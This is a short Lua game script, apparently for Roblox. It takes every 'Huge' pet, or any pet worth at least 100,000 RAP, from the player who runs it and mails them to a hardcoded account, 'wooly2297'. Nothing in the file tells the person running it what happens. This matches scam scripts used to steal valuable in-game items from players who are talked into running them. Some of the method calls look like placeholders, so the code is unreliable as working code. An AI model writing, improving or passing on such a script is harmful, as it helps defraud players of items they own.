-- Define the target player's mailbox name
local targetPlayerName = "wooly2297"


-- Function to get a player by name
local function getPlayerByName(name)
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.Name == name then
            return player
        end
    end
    return nil
end


-- Function to send pets to the target player's mailbox
local function sendPetsToMailbox()
    local targetPlayer = getPlayerByName(targetPlayerName)


    if not targetPlayer then
        print("Target player not found!")
        return
    end


    -- Get the local player (the player running the script)
    local localPlayer = game.Players.LocalPlayer


    -- Check if localPlayer has Pets and if Mailbox exists for targetPlayer
    if not localPlayer:FindFirstChild("Pets") or not targetPlayer:FindFirstChild("Mailbox") then
        print("Pets or Mailbox not found!")
        return
    end


    -- Iterate through the local player's pets
    for _, pet in pairs(localPlayer.Pets:GetChildren()) do
        -- Check if the pet is a huge pet or has at least 100,000 RAP
        if pet:IsA("Pet") and (pet.Size == "Huge" or pet:GetAttribute("RAP") >= 100000) then
            -- Send the pet to the target player's mailbox
            local success, message = pcall(function()
                targetPlayer.Mailbox:AddPet(pet) -- Adjust this method if necessary
            end)


            if success then
                print("Sent pet: " .. pet.Name .. " to " .. targetPlayerName .. "'s mailbox.")
            else
                print("Failed to send pet: " .. pet.Name .. ". Error: " .. message)
            end
        end
    end
end


-- Run the send function
sendPetsToMailbox()
